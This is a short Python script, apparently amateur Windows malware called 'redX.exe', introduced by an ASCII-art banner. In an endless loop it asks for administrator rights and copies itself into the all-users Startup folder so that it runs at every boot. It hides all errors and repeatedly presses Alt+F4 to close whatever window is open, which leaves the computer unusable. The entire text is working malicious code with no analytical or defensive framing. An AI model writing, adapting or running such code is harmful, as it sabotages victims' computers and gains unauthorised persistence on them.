'''

.%%%%%....%%%%...%%..%%..%%%%%%..%%%%%%..%%...............%%%%...........%%%%%%.
.%%..%%..%%..%%..%%%.%%....%%....%%......%%..............%%..%%..............%%.
.%%..%%..%%%%%%..%%.%%%....%%....%%%%....%%..............%%..................%%.
.%%..%%..%%..%%..%%..%%....%%....%%......%%..............%%..%%....%%....%%..%%.
.%%%%%...%%..%%..%%..%%..%%%%%%..%%%%%%..%%%%%%...........%%%%.....%%.....%%%%..
................................................................................

'''
import os
import pyautogui as gui
import pyuac
import shutil

while True:

    # This checks whether the malware exists in desired path or not yet.
    try:
        if not os.path.exists(
                "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe"):  # If malware not exists in the path

            if not pyuac.isUserAdmin():
                pyuac.runAsAdmin()  # Asks admin permission for copying the malware

            else:  # If admin permission already granted
                shutil.copy(os.getcwd() + "\\redX.exe",
                            "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")  # Copy itself in the startup folder
        else:
            pass

    except: # If there's any error just pass it away
        pass
    
    finally:
        gui.hotkey("alt", "f4")
